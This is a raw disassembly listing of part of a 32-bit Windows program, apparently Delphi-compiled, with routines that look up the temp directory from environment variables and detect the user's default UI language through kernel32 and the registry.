  406941:	80 3b 22             	cmpb   $0x22,(%ebx)
  406944:	75 0b                	jne    0x406951
  406946:	80 7b 01 22          	cmpb   $0x22,0x1(%ebx)
  40694a:	75 05                	jne    0x406951
  40694c:	83 c3 02             	add    $0x2,%ebx
  40694f:	eb e6                	jmp    0x406937
  406951:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  406954:	33 d2                	xor    %edx,%edx
  406956:	8b c3                	mov    %ebx,%eax
  406958:	e8 6f ff ff ff       	call   0x4068cc
  40695d:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406960:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406963:	33 d2                	xor    %edx,%edx
  406965:	e8 0e c9 ff ff       	call   0x403278
  40696a:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40696d:	e8 ae ca ff ff       	call   0x403420
  406972:	8b d0                	mov    %eax,%edx
  406974:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  406977:	8b c3                	mov    %ebx,%eax
  406979:	e8 4e ff ff ff       	call   0x4068cc
  40697e:	8b d8                	mov    %eax,%ebx
  406980:	8b c6                	mov    %esi,%eax
  406982:	8b 55 f8             	mov    -0x8(%ebp),%edx
  406985:	e8 5e c8 ff ff       	call   0x4031e8
  40698a:	33 c0                	xor    %eax,%eax
  40698c:	5a                   	pop    %edx
  40698d:	59                   	pop    %ecx
  40698e:	59                   	pop    %ecx
  40698f:	64 89 10             	mov    %edx,%fs:(%eax)
  406992:	68 a7 69 40 00       	push   $0x4069a7
  406997:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40699a:	e8 f9 c7 ff ff       	call   0x403198
  40699f:	c3                   	ret
  4069a0:	e9 57 c4 ff ff       	jmp    0x402dfc
  4069a5:	eb f0                	jmp    0x406997
  4069a7:	8b c3                	mov    %ebx,%eax
  4069a9:	5f                   	pop    %edi
  4069aa:	5e                   	pop    %esi
  4069ab:	5b                   	pop    %ebx
  4069ac:	59                   	pop    %ecx
  4069ad:	59                   	pop    %ecx
  4069ae:	5d                   	pop    %ebp
  4069af:	c3                   	ret
  4069b0:	55                   	push   %ebp
  4069b1:	8b ec                	mov    %esp,%ebp
  4069b3:	6a 00                	push   $0x0
  4069b5:	6a 00                	push   $0x0
  4069b7:	53                   	push   %ebx
  4069b8:	56                   	push   %esi
  4069b9:	57                   	push   %edi
  4069ba:	33 c0                	xor    %eax,%eax
  4069bc:	55                   	push   %ebp
  4069bd:	68 0c 6a 40 00       	push   $0x406a0c
  4069c2:	64 ff 30             	push   %fs:(%eax)
  4069c5:	64 89 20             	mov    %esp,%fs:(%eax)
  4069c8:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4069cb:	e8 bc fe ff ff       	call   0x40688c
  4069d0:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4069d3:	e8 3c ca ff ff       	call   0x403414
  4069d8:	8b d8                	mov    %eax,%ebx
  4069da:	33 f6                	xor    %esi,%esi
  4069dc:	8d 55 f8             	lea    -0x8(%ebp),%edx
  4069df:	8b c3                	mov    %ebx,%eax
  4069e1:	e8 2e ff ff ff       	call   0x406914
  4069e6:	8b d8                	mov    %eax,%ebx
  4069e8:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  4069ec:	74 03                	je     0x4069f1
  4069ee:	46                   	inc    %esi
  4069ef:	eb eb                	jmp    0x4069dc
  4069f1:	33 c0                	xor    %eax,%eax
  4069f3:	5a                   	pop    %edx
  4069f4:	59                   	pop    %ecx
  4069f5:	59                   	pop    %ecx
  4069f6:	64 89 10             	mov    %edx,%fs:(%eax)
  4069f9:	68 13 6a 40 00       	push   $0x406a13
  4069fe:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406a01:	ba 02 00 00 00       	mov    $0x2,%edx
  406a06:	e8 ad c7 ff ff       	call   0x4031b8
  406a0b:	c3                   	ret
  406a0c:	e9 eb c3 ff ff       	jmp    0x402dfc
  406a11:	eb eb                	jmp    0x4069fe
  406a13:	8b c6                	mov    %esi,%eax
  406a15:	5f                   	pop    %edi
  406a16:	5e                   	pop    %esi
  406a17:	5b                   	pop    %ebx
  406a18:	59                   	pop    %ecx
  406a19:	59                   	pop    %ecx
  406a1a:	5d                   	pop    %ebp
  406a1b:	c3                   	ret
  406a1c:	55                   	push   %ebp
  406a1d:	8b ec                	mov    %esp,%ebp
  406a1f:	81 c4 f8 fe ff ff    	add    $0xfffffef8,%esp
  406a25:	53                   	push   %ebx
  406a26:	56                   	push   %esi
  406a27:	57                   	push   %edi
  406a28:	33 c9                	xor    %ecx,%ecx
  406a2a:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  406a2d:	8b f2                	mov    %edx,%esi
  406a2f:	8b d8                	mov    %eax,%ebx
  406a31:	33 c0                	xor    %eax,%eax
  406a33:	55                   	push   %ebp
  406a34:	68 a7 6a 40 00       	push   $0x406aa7
  406a39:	64 ff 30             	push   %fs:(%eax)
  406a3c:	64 89 20             	mov    %esp,%fs:(%eax)
  406a3f:	85 db                	test   %ebx,%ebx
  406a41:	75 24                	jne    0x406a67
  406a43:	68 04 01 00 00       	push   $0x104
  406a48:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  406a4e:	50                   	push   %eax
  406a4f:	6a 00                	push   $0x0
  406a51:	e8 fe d9 ff ff       	call   0x404454
  406a56:	8b c8                	mov    %eax,%ecx
  406a58:	8d 95 f8 fe ff ff    	lea    -0x108(%ebp),%edx
  406a5e:	8b c6                	mov    %esi,%eax
  406a60:	e8 13 c8 ff ff       	call   0x403278
  406a65:	eb 2a                	jmp    0x406a91
  406a67:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406a6a:	e8 1d fe ff ff       	call   0x40688c
  406a6f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406a72:	e8 9d c9 ff ff       	call   0x403414
  406a77:	8b f8                	mov    %eax,%edi
  406a79:	8b d6                	mov    %esi,%edx
  406a7b:	8b c7                	mov    %edi,%eax
  406a7d:	e8 92 fe ff ff       	call   0x406914
  406a82:	8b f8                	mov    %eax,%edi
  406a84:	83 fb 01             	cmp    $0x1,%ebx
  406a87:	74 08                	je     0x406a91
  406a89:	83 3e 00             	cmpl   $0x0,(%esi)
  406a8c:	74 03                	je     0x406a91
  406a8e:	4b                   	dec    %ebx
  406a8f:	eb e8                	jmp    0x406a79
  406a91:	33 c0                	xor    %eax,%eax
  406a93:	5a                   	pop    %edx
  406a94:	59                   	pop    %ecx
  406a95:	59                   	pop    %ecx
  406a96:	64 89 10             	mov    %edx,%fs:(%eax)
  406a99:	68 ae 6a 40 00       	push   $0x406aae
  406a9e:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406aa1:	e8 f2 c6 ff ff       	call   0x403198
  406aa6:	c3                   	ret
  406aa7:	e9 50 c3 ff ff       	jmp    0x402dfc
  406aac:	eb f0                	jmp    0x406a9e
  406aae:	5f                   	pop    %edi
  406aaf:	5e                   	pop    %esi
  406ab0:	5b                   	pop    %ebx
  406ab1:	8b e5                	mov    %ebp,%esp
  406ab3:	5d                   	pop    %ebp
  406ab4:	c3                   	ret
  406ab5:	8d 40 00             	lea    0x0(%eax),%eax
  406ab8:	53                   	push   %ebx
  406ab9:	81 c4 fc fe ff ff    	add    $0xfffffefc,%esp
  406abf:	8b d8                	mov    %eax,%ebx
  406ac1:	68 04 01 00 00       	push   $0x104
  406ac6:	8d 44 24 04          	lea    0x4(%esp),%eax
  406aca:	50                   	push   %eax
  406acb:	e8 bc d9 ff ff       	call   0x40448c
  406ad0:	8b d3                	mov    %ebx,%edx
  406ad2:	8b c4                	mov    %esp,%eax
  406ad4:	e8 57 e2 ff ff       	call   0x404d30
  406ad9:	81 c4 04 01 00 00    	add    $0x104,%esp
  406adf:	5b                   	pop    %ebx
  406ae0:	c3                   	ret
  406ae1:	8d 40 00             	lea    0x0(%eax),%eax
  406ae4:	55                   	push   %ebp
  406ae5:	8b ec                	mov    %esp,%ebp
  406ae7:	6a 00                	push   $0x0
  406ae9:	6a 00                	push   $0x0
  406aeb:	53                   	push   %ebx
  406aec:	56                   	push   %esi
  406aed:	57                   	push   %edi
  406aee:	8b d8                	mov    %eax,%ebx
  406af0:	33 c0                	xor    %eax,%eax
  406af2:	55                   	push   %ebp
  406af3:	68 9c 6b 40 00       	push   $0x406b9c
  406af8:	64 ff 30             	push   %fs:(%eax)
  406afb:	64 89 20             	mov    %esp,%fs:(%eax)
  406afe:	8b d3                	mov    %ebx,%edx
  406b00:	b8 b4 6b 40 00       	mov    $0x406bb4,%eax
  406b05:	e8 32 fd ff ff       	call   0x40683c
  406b0a:	83 3b 00             	cmpl   $0x0,(%ebx)
  406b0d:	74 0b                	je     0x406b1a
  406b0f:	8b 03                	mov    (%ebx),%eax
  406b11:	e8 02 fd ff ff       	call   0x406818
  406b16:	84 c0                	test   %al,%al
  406b18:	75 48                	jne    0x406b62
  406b1a:	8b d3                	mov    %ebx,%edx
  406b1c:	b8 c0 6b 40 00       	mov    $0x406bc0,%eax
  406b21:	e8 16 fd ff ff       	call   0x40683c
  406b26:	83 3b 00             	cmpl   $0x0,(%ebx)
  406b29:	74 0b                	je     0x406b36
  406b2b:	8b 03                	mov    (%ebx),%eax
  406b2d:	e8 e6 fc ff ff       	call   0x406818
  406b32:	84 c0                	test   %al,%al
  406b34:	75 2c                	jne    0x406b62
  406b36:	83 3d 7c a0 40 00 02 	cmpl   $0x2,0x40a07c
  406b3d:	75 1c                	jne    0x406b5b
  406b3f:	8b d3                	mov    %ebx,%edx
  406b41:	b8 d0 6b 40 00       	mov    $0x406bd0,%eax
  406b46:	e8 f1 fc ff ff       	call   0x40683c
  406b4b:	83 3b 00             	cmpl   $0x0,(%ebx)
  406b4e:	74 0b                	je     0x406b5b
  406b50:	8b 03                	mov    (%ebx),%eax
  406b52:	e8 c1 fc ff ff       	call   0x406818
  406b57:	84 c0                	test   %al,%al
  406b59:	75 07                	jne    0x406b62
  406b5b:	8b c3                	mov    %ebx,%eax
  406b5d:	e8 56 ff ff ff       	call   0x406ab8
  406b62:	8d 55 f8             	lea    -0x8(%ebp),%edx
  406b65:	8b 03                	mov    (%ebx),%eax
  406b67:	e8 74 fb ff ff       	call   0x4066e0
  406b6c:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406b6f:	8d 55 fc             	lea    -0x4(%ebp),%edx
  406b72:	e8 1d fa ff ff       	call   0x406594
  406b77:	8b 55 fc             	mov    -0x4(%ebp),%edx
  406b7a:	8b c3                	mov    %ebx,%eax
  406b7c:	e8 ab c6 ff ff       	call   0x40322c
  406b81:	33 c0                	xor    %eax,%eax
  406b83:	5a                   	pop    %edx
  406b84:	59                   	pop    %ecx
  406b85:	59                   	pop    %ecx
  406b86:	64 89 10             	mov    %edx,%fs:(%eax)
  406b89:	68 a3 6b 40 00       	push   $0x406ba3
  406b8e:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406b91:	ba 02 00 00 00       	mov    $0x2,%edx
  406b96:	e8 1d c6 ff ff       	call   0x4031b8
  406b9b:	c3                   	ret
  406b9c:	e9 5b c2 ff ff       	jmp    0x402dfc
  406ba1:	eb eb                	jmp    0x406b8e
  406ba3:	5f                   	pop    %edi
  406ba4:	5e                   	pop    %esi
  406ba5:	5b                   	pop    %ebx
  406ba6:	59                   	pop    %ecx
  406ba7:	59                   	pop    %ecx
  406ba8:	5d                   	pop    %ebp
  406ba9:	c3                   	ret
  406baa:	00 00                	add    %al,(%eax)
  406bac:	ff                   	(bad)
  406bad:	ff                   	(bad)
  406bae:	ff                   	(bad)
  406baf:	ff 03                	incl   (%ebx)
  406bb1:	00 00                	add    %al,(%eax)
  406bb3:	00 54 4d 50          	add    %dl,0x50(%ebp,%ecx,2)
  406bb7:	00 ff                	add    %bh,%bh
  406bb9:	ff                   	(bad)
  406bba:	ff                   	(bad)
  406bbb:	ff 04 00             	incl   (%eax,%eax,1)
  406bbe:	00 00                	add    %al,(%eax)
  406bc0:	54                   	push   %esp
  406bc1:	45                   	inc    %ebp
  406bc2:	4d                   	dec    %ebp
  406bc3:	50                   	push   %eax
  406bc4:	00 00                	add    %al,(%eax)
  406bc6:	00 00                	add    %al,(%eax)
  406bc8:	ff                   	(bad)
  406bc9:	ff                   	(bad)
  406bca:	ff                   	(bad)
  406bcb:	ff 0b                	decl   (%ebx)
  406bcd:	00 00                	add    %al,(%eax)
  406bcf:	00 55 53             	add    %dl,0x53(%ebp)
  406bd2:	45                   	inc    %ebp
  406bd3:	52                   	push   %edx
  406bd4:	50                   	push   %eax
  406bd5:	52                   	push   %edx
  406bd6:	4f                   	dec    %edi
  406bd7:	46                   	inc    %esi
  406bd8:	49                   	dec    %ecx
  406bd9:	4c                   	dec    %esp
  406bda:	45                   	inc    %ebp
  406bdb:	00 53 56             	add    %dl,0x56(%ebx)
  406bde:	57                   	push   %edi
  406bdf:	8b f2                	mov    %edx,%esi
  406be1:	8b f8                	mov    %eax,%edi
  406be3:	8b 07                	mov    (%edi),%eax
  406be5:	e8 0a c7 ff ff       	call   0x4032f4
  406bea:	3b c6                	cmp    %esi,%eax
  406bec:	0f 9f c3             	setg   %bl
  406bef:	8b c7                	mov    %edi,%eax
  406bf1:	8b d6                	mov    %esi,%edx
  406bf3:	e8 f8 c8 ff ff       	call   0x4034f0
  406bf8:	8b c3                	mov    %ebx,%eax
  406bfa:	5f                   	pop    %edi
  406bfb:	5e                   	pop    %esi
  406bfc:	5b                   	pop    %ebx
  406bfd:	c3                   	ret
  406bfe:	8b c0                	mov    %eax,%eax
  406c00:	55                   	push   %ebp
  406c01:	8b ec                	mov    %esp,%ebp
  406c03:	83 c4 f0             	add    $0xfffffff0,%esp
  406c06:	53                   	push   %ebx
  406c07:	56                   	push   %esi
  406c08:	57                   	push   %edi
  406c09:	33 db                	xor    %ebx,%ebx
  406c0b:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  406c0e:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  406c11:	8b fa                	mov    %edx,%edi
  406c13:	8b f0                	mov    %eax,%esi
  406c15:	33 c0                	xor    %eax,%eax
  406c17:	55                   	push   %ebp
  406c18:	68 21 6d 40 00       	push   $0x406d21
  406c1d:	64 ff 30             	push   %fs:(%eax)
  406c20:	64 89 20             	mov    %esp,%fs:(%eax)
  406c23:	33 db                	xor    %ebx,%ebx
  406c25:	33 c0                	xor    %eax,%eax
  406c27:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406c2a:	8d 45 f4             	lea    -0xc(%ebp),%eax
  406c2d:	50                   	push   %eax
  406c2e:	6a 00                	push   $0x0
  406c30:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406c33:	50                   	push   %eax
  406c34:	6a 00                	push   $0x0
  406c36:	57                   	push   %edi
  406c37:	56                   	push   %esi
  406c38:	e8 7f d7 ff ff       	call   0x4043bc
  406c3d:	85 c0                	test   %eax,%eax
  406c3f:	0f 85 c6 00 00 00    	jne    0x406d0b
  406c45:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406c48:	3b 45 0c             	cmp    0xc(%ebp),%eax
  406c4b:	74 0c                	je     0x406c59
  406c4d:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406c50:	3b 45 08             	cmp    0x8(%ebp),%eax
  406c53:	0f 85 b2 00 00 00    	jne    0x406d0b
  406c59:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  406c5d:	75 0f                	jne    0x406c6e
  406c5f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406c62:	e8 31 c5 ff ff       	call   0x403198
  406c67:	b3 01                	mov    $0x1,%bl
  406c69:	e9 9d 00 00 00       	jmp    0x406d0b
  406c6e:	8d 45 f0             	lea    -0x10(%ebp),%eax
  406c71:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  406c74:	33 d2                	xor    %edx,%edx
  406c76:	e8 fd c5 ff ff       	call   0x403278
  406c7b:	8d 45 f4             	lea    -0xc(%ebp),%eax
  406c7e:	50                   	push   %eax
  406c7f:	8d 45 f0             	lea    -0x10(%ebp),%eax
  406c82:	e8 99 c7 ff ff       	call   0x403420
  406c87:	50                   	push   %eax
  406c88:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406c8b:	50                   	push   %eax
  406c8c:	6a 00                	push   $0x0
  406c8e:	57                   	push   %edi
  406c8f:	56                   	push   %esi
  406c90:	e8 27 d7 ff ff       	call   0x4043bc
  406c95:	3d ea 00 00 00       	cmp    $0xea,%eax
  406c9a:	74 89                	je     0x406c25
  406c9c:	85 c0                	test   %eax,%eax
  406c9e:	75 6b                	jne    0x406d0b
  406ca0:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406ca3:	3b 45 0c             	cmp    0xc(%ebp),%eax
  406ca6:	74 0d                	je     0x406cb5
  406ca8:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406cab:	3b 45 08             	cmp    0x8(%ebp),%eax
  406cae:	75 5b                	jne    0x406d0b
  406cb0:	eb 03                	jmp    0x406cb5
  406cb2:	ff 4d f4             	decl   -0xc(%ebp)
  406cb5:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  406cb9:	74 0d                	je     0x406cc8
  406cbb:	8b 45 f0             	mov    -0x10(%ebp),%eax
  406cbe:	8b 55 f4             	mov    -0xc(%ebp),%edx
  406cc1:	80 7c 10 ff 00       	cmpb   $0x0,-0x1(%eax,%edx,1)
  406cc6:	74 ea                	je     0x406cb2
  406cc8:	83 7d f8 07          	cmpl   $0x7,-0x8(%ebp)
  406ccc:	75 09                	jne    0x406cd7
  406cce:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  406cd2:	74 03                	je     0x406cd7
  406cd4:	ff 45 f4             	incl   -0xc(%ebp)
  406cd7:	8d 45 f0             	lea    -0x10(%ebp),%eax
  406cda:	8b 55 f4             	mov    -0xc(%ebp),%edx
  406cdd:	e8 0e c8 ff ff       	call   0x4034f0
  406ce2:	83 7d f8 07          	cmpl   $0x7,-0x8(%ebp)
  406ce6:	75 16                	jne    0x406cfe
  406ce8:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  406cec:	74 10                	je     0x406cfe
  406cee:	8d 45 f0             	lea    -0x10(%ebp),%eax
  406cf1:	e8 2a c7 ff ff       	call   0x403420
  406cf6:	8b 55 f4             	mov    -0xc(%ebp),%edx
  406cf9:	c6 44 10 ff 00       	movb   $0x0,-0x1(%eax,%edx,1)
  406cfe:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406d01:	8b 55 f0             	mov    -0x10(%ebp),%edx
  406d04:	e8 df c4 ff ff       	call   0x4031e8
  406d09:	b3 01                	mov    $0x1,%bl
  406d0b:	33 c0                	xor    %eax,%eax
  406d0d:	5a                   	pop    %edx
  406d0e:	59                   	pop    %ecx
  406d0f:	59                   	pop    %ecx
  406d10:	64 89 10             	mov    %edx,%fs:(%eax)
  406d13:	68 28 6d 40 00       	push   $0x406d28
  406d18:	8d 45 f0             	lea    -0x10(%ebp),%eax
  406d1b:	e8 78 c4 ff ff       	call   0x403198
  406d20:	c3                   	ret
  406d21:	e9 d6 c0 ff ff       	jmp    0x402dfc
  406d26:	eb f0                	jmp    0x406d18
  406d28:	8b c3                	mov    %ebx,%eax
  406d2a:	5f                   	pop    %edi
  406d2b:	5e                   	pop    %esi
  406d2c:	5b                   	pop    %ebx
  406d2d:	8b e5                	mov    %ebp,%esp
  406d2f:	5d                   	pop    %ebp
  406d30:	c2 08 00             	ret    $0x8
  406d33:	90                   	nop
  406d34:	6a 01                	push   $0x1
  406d36:	6a 02                	push   $0x2
  406d38:	e8 c3 fe ff ff       	call   0x406c00
  406d3d:	c3                   	ret
  406d3e:	8b c0                	mov    %eax,%eax
  406d40:	55                   	push   %ebp
  406d41:	8b ec                	mov    %esp,%ebp
  406d43:	56                   	push   %esi
  406d44:	8b 75 0c             	mov    0xc(%ebp),%esi
  406d47:	3c 02                	cmp    $0x2,%al
  406d49:	75 06                	jne    0x406d51
  406d4b:	81 ce 00 01 00 00    	or     $0x100,%esi
  406d51:	8b 45 08             	mov    0x8(%ebp),%eax
  406d54:	50                   	push   %eax
  406d55:	56                   	push   %esi
  406d56:	8b 45 10             	mov    0x10(%ebp),%eax
  406d59:	50                   	push   %eax
  406d5a:	51                   	push   %ecx
  406d5b:	52                   	push   %edx
  406d5c:	e8 53 d6 ff ff       	call   0x4043b4
  406d61:	5e                   	pop    %esi
  406d62:	5d                   	pop    %ebp
  406d63:	c2 0c 00             	ret    $0xc
  406d66:	8b c0                	mov    %eax,%eax
  406d68:	8b 10                	mov    (%eax),%edx
  406d6a:	33 c9                	xor    %ecx,%ecx
  406d6c:	89 08                	mov    %ecx,(%eax)
  406d6e:	8b c2                	mov    %edx,%eax
  406d70:	e8 af bb ff ff       	call   0x402924
  406d75:	c3                   	ret
  406d76:	8b c0                	mov    %eax,%eax
  406d78:	55                   	push   %ebp
  406d79:	8b ec                	mov    %esp,%ebp
  406d7b:	83 c4 f4             	add    $0xfffffff4,%esp
  406d7e:	53                   	push   %ebx
  406d7f:	8b d8                	mov    %eax,%ebx
  406d81:	52                   	push   %edx
  406d82:	e8 45 d7 ff ff       	call   0x4044cc
  406d87:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406d8a:	33 c0                	xor    %eax,%eax
  406d8c:	55                   	push   %ebp
  406d8d:	68 ea 6d 40 00       	push   $0x406dea
  406d92:	64 ff 30             	push   %fs:(%eax)
  406d95:	64 89 20             	mov    %esp,%fs:(%eax)
  406d98:	d9 7d fe             	fnstcw -0x2(%ebp)
  406d9b:	33 c0                	xor    %eax,%eax
  406d9d:	55                   	push   %ebp
  406d9e:	68 cc 6d 40 00       	push   $0x406dcc
  406da3:	64 ff 30             	push   %fs:(%eax)
  406da6:	64 89 20             	mov    %esp,%fs:(%eax)
  406da9:	8b c3                	mov    %ebx,%eax
  406dab:	e8 64 c6 ff ff       	call   0x403414
  406db0:	50                   	push   %eax
  406db1:	e8 e6 d6 ff ff       	call   0x40449c
  406db6:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406db9:	33 c0                	xor    %eax,%eax
  406dbb:	5a                   	pop    %edx
  406dbc:	59                   	pop    %ecx
  406dbd:	59                   	pop    %ecx
  406dbe:	64 89 10             	mov    %edx,%fs:(%eax)
  406dc1:	68 d3 6d 40 00       	push   $0x406dd3
  406dc6:	db e2                	fnclex
  406dc8:	d9 6d fe             	fldcw  -0x2(%ebp)
  406dcb:	c3                   	ret
  406dcc:	e9 2b c0 ff ff       	jmp    0x402dfc
  406dd1:	eb f3                	jmp    0x406dc6
  406dd3:	33 c0                	xor    %eax,%eax
  406dd5:	5a                   	pop    %edx
  406dd6:	59                   	pop    %ecx
  406dd7:	59                   	pop    %ecx
  406dd8:	64 89 10             	mov    %edx,%fs:(%eax)
  406ddb:	68 f1 6d 40 00       	push   $0x406df1
  406de0:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406de3:	50                   	push   %eax
  406de4:	e8 e3 d6 ff ff       	call   0x4044cc
  406de9:	c3                   	ret
  406dea:	e9 0d c0 ff ff       	jmp    0x402dfc
  406def:	eb ef                	jmp    0x406de0
  406df1:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406df4:	5b                   	pop    %ebx
  406df5:	8b e5                	mov    %ebp,%esp
  406df7:	5d                   	pop    %ebp
  406df8:	c3                   	ret
  406df9:	8d 40 00             	lea    0x0(%eax),%eax
  406dfc:	55                   	push   %ebp
  406dfd:	8b ec                	mov    %esp,%ebp
  406dff:	83 c4 f0             	add    $0xfffffff0,%esp
  406e02:	53                   	push   %ebx
  406e03:	56                   	push   %esi
  406e04:	57                   	push   %edi
  406e05:	33 c0                	xor    %eax,%eax
  406e07:	89 45 f0             	mov    %eax,-0x10(%ebp)
  406e0a:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406e0d:	33 c0                	xor    %eax,%eax
  406e0f:	55                   	push   %ebp
  406e10:	68 01 6f 40 00       	push   $0x406f01
  406e15:	64 ff 30             	push   %fs:(%eax)
  406e18:	64 89 20             	mov    %esp,%fs:(%eax)
  406e1b:	68 14 6f 40 00       	push   $0x406f14
  406e20:	68 30 6f 40 00       	push   $0x406f30
  406e25:	e8 32 d6 ff ff       	call   0x40445c
  406e2a:	50                   	push   %eax
  406e2b:	e8 34 d6 ff ff       	call   0x404464
  406e30:	8b d8                	mov    %eax,%ebx
  406e32:	85 db                	test   %ebx,%ebx
  406e34:	74 09                	je     0x406e3f
  406e36:	ff d3                	call   *%ebx
  406e38:	8b d8                	mov    %eax,%ebx
  406e3a:	e9 a4 00 00 00       	jmp    0x406ee3
  406e3f:	83 3d 7c a0 40 00 02 	cmpl   $0x2,0x40a07c
  406e46:	75 38                	jne    0x406e80
  406e48:	6a 00                	push   $0x0
  406e4a:	6a 01                	push   $0x1
  406e4c:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406e4f:	50                   	push   %eax
  406e50:	b9 40 6f 40 00       	mov    $0x406f40,%ecx
  406e55:	ba 03 00 00 80       	mov    $0x80000003,%edx
  406e5a:	33 c0                	xor    %eax,%eax
  406e5c:	e8 df fe ff ff       	call   0x406d40
  406e61:	85 c0                	test   %eax,%eax
  406e63:	75 51                	jne    0x406eb6
  406e65:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  406e68:	ba 68 6f 40 00       	mov    $0x406f68,%edx
  406e6d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406e70:	e8 bf fe ff ff       	call   0x406d34
  406e75:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406e78:	50                   	push   %eax
  406e79:	e8 2e d5 ff ff       	call   0x4043ac
  406e7e:	eb 36                	jmp    0x406eb6
  406e80:	6a 00                	push   $0x0
  406e82:	6a 01                	push   $0x1
  406e84:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406e87:	50                   	push   %eax
  406e88:	b9 70 6f 40 00       	mov    $0x406f70,%ecx
  406e8d:	ba 01 00 00 80       	mov    $0x80000001,%edx
  406e92:	33 c0                	xor    %eax,%eax
  406e94:	e8 a7 fe ff ff       	call   0x406d40
  406e99:	85 c0                	test   %eax,%eax
  406e9b:	75 19                	jne    0x406eb6
  406e9d:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  406ea0:	ba 98 6f 40 00       	mov    $0x406f98,%edx
  406ea5:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406ea8:	e8 87 fe ff ff       	call   0x406d34
  406ead:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406eb0:	50                   	push   %eax
  406eb1:	e8 f6 d4 ff ff       	call   0x4043ac
  406eb6:	ba a4 6f 40 00       	mov    $0x406fa4,%edx
  406ebb:	8d 45 f0             	lea    -0x10(%ebp),%eax
  406ebe:	e8 69 c3 ff ff       	call   0x40322c
  406ec3:	8d 45 f0             	lea    -0x10(%ebp),%eax
  406ec6:	8b 55 f8             	mov    -0x8(%ebp),%edx
  406ec9:	e8 2e c4 ff ff       	call   0x4032fc
  406ece:	8b 45 f0             	mov    -0x10(%ebp),%eax
  406ed1:	8d 55 f4             	lea    -0xc(%ebp),%edx
  406ed4:	e8 db b8 ff ff       	call   0x4027b4
  406ed9:	8b d8                	mov    %eax,%ebx
  406edb:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  406edf:	74 02                	je     0x406ee3
  406ee1:	33 db                	xor    %ebx,%ebx
  406ee3:	33 c0                	xor    %eax,%eax
  406ee5:	5a                   	pop    %edx
  406ee6:	59                   	pop    %ecx
  406ee7:	59                   	pop    %ecx
  406ee8:	64 89 10             	mov    %edx,%fs:(%eax)
  406eeb:	68 08 6f 40 00       	push   $0x406f08
  406ef0:	8d 45 f0             	lea    -0x10(%ebp),%eax
  406ef3:	e8 a0 c2 ff ff       	call   0x403198
  406ef8:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406efb:	e8 98 c2 ff ff       	call   0x403198
  406f00:	c3                   	ret
  406f01:	e9 f6 be ff ff       	jmp    0x402dfc
  406f06:	eb e8                	jmp    0x406ef0
  406f08:	8b c3                	mov    %ebx,%eax
  406f0a:	5f                   	pop    %edi
  406f0b:	5e                   	pop    %esi
  406f0c:	5b                   	pop    %ebx
  406f0d:	8b e5                	mov    %ebp,%esp
  406f0f:	5d                   	pop    %ebp
  406f10:	c3                   	ret
  406f11:	00 00                	add    %al,(%eax)
  406f13:	00 47 65             	add    %al,0x65(%edi)
  406f16:	74 55                	je     0x406f6d
  406f18:	73 65                	jae    0x406f7f
  406f1a:	72 44                	jb     0x406f60
  406f1c:	65 66 61             	gs popaw
  406f1f:	75 6c                	jne    0x406f8d
  406f21:	74 55                	je     0x406f78
  406f23:	49                   	dec    %ecx
  406f24:	4c                   	dec    %esp
  406f25:	61                   	popa
  406f26:	6e                   	outsb  %ds:(%esi),(%dx)
  406f27:	67 75 61             	addr16 jne 0x406f8b
  406f2a:	67 65 00 00          	add    %al,%gs:(%bx,%si)
  406f2e:	00 00                	add    %al,(%eax)
  406f30:	6b 65 72 6e          	imul   $0x6e,0x72(%ebp),%esp
  406f34:	65 6c                	gs insb (%dx),%es:(%edi)
  406f36:	33 32                	xor    (%edx),%esi
  406f38:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  406f3b:	6c                   	insb   (%dx),%es:(%edi)
  406f3c:	00 00                	add    %al,(%eax)
  406f3e:	00 00                	add    %al,(%eax)
  406f40:	2e 44                	cs inc %esp
  406f42:	45                   	inc    %ebp
  406f43:	46                   	inc    %esi
  406f44:	41                   	inc    %ecx
  406f45:	55                   	push   %ebp
  406f46:	4c                   	dec    %esp
  406f47:	54                   	push   %esp
  406f48:	5c                   	pop    %esp
  406f49:	43                   	inc    %ebx
  406f4a:	6f                   	outsl  %ds:(%esi),(%dx)
